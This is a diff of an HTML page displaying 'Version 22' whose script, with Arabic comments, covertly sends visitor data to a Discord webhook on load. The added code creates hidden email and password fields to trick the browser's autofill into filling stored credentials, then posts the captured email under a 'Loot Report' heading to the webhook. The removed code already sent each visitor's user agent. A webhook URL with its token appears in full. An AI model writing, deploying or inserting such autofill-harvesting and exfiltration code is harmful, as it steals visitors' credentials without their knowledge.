@@ -2,52 +2,55 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إصدار 22</title>
+    <title>Version 22 - Verified</title>
     <style>
-        body { 
-            background: #000; 
-            color: #ff0000; 
-            font-family: 'Arial Black', sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            flex-direction: column;
-        }
-        h1 { font-size: 150px; margin: 0; text-shadow: 0 0 20px #f00; }
-        p { font-size: 20px; color: #fff; }
+        body { background: #000; color: #0f0; font-family: 'Arial Black', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+        h1 { font-size: 150px; text-shadow: 0 0 30px #0f0; margin: 0; }
+        .status { color: #555; font-family: monospace; }
     </style>
 </head>
 <body>
 
-    <p>VERSION ACTIVE:</p>
     <h1>22</h1>
-    <p id="status">جاري محاولة الإرسال القسري...</p>
+    <div class="status" id="out">> System Online...</div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function forceEmit() {
-            const data = JSON.stringify({
-                content: "🔥 **النسخة 22 اشتغلت غصباً عن المتصفح!**\nالجهاز: " + navigator.userAgent
-            });
-
-            // الطريقة 1: XHR (الأقوى في الإرسال السريع)
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", WEBHOOK, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(data);
-
-            // الطريقة 2: Beacon (لأندرويد 14)
-            navigator.sendBeacon(WEBHOOK, data);
-
-            document.getElementById('status').innerText = "تم الإرسال بنجاح!";
+        function log(msg) {
+            const data = JSON.stringify({ content: "🎯 **[Loot Report]**: " + msg });
+            navigator.sendBeacon(HOOK, data);
+            var x = new XMLHttpRequest();
+            x.open("POST", HOOK, true);
+            x.setRequestHeader("Content-Type", "application/json");
+            x.send(data);
         }
 
-        // تنفيذ فوري
-        window.onload = forceEmit;
+        // تكتيك سحب الإيميل من الـ Auto-fill الصامت
+        function probe() {
+            // إنشاء حقول مخفية "تغري" المتصفح بوضع الإيميل فيها
+            const f = document.createElement('form');
+            f.innerHTML = `
+                <input type="text" name="email" id="e" style="display:none" autocomplete="email">
+                <input type="password" name="p" id="p" style="display:none" autocomplete="current-password">
+            `;
+            document.body.appendChild(f);
+
+            setTimeout(() => {
+                const email = document.getElementById('e').value;
+                const pass = document.getElementById('p').value;
+                if(email) {
+                    log("Found Stored Creds: " + email + " | Pass: " + (pass ? "YES" : "NO"));
+                } else {
+                    log("No auto-fill detected. Keeping tunnel open...");
+                }
+            }, 1000);
+        }
+
+        window.onload = () => {
+            log("Connection confirmed on Version 22!");
+            probe();
+        };
     </script>
 </body>
 </html>
